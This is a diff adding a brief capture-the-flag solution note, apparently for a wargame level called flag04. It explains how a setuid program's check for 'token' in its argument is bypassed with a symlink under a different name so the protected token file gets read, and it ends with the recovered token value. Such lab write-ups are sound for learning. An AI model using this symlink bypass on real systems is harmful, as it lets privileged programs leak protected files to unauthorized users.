@@ -1,0 +1,6 @@
+Bypass string search:
+if(strstr(argv[1], "token") != NULL) 
+--> create symlink file with filename no "token"
+ln -s /home/flag04/token /tmp/flag04
+/home/flag04/flag04 /tmp/flag04
+06508b5e-8909-4f38-b630-fdb148a848a2
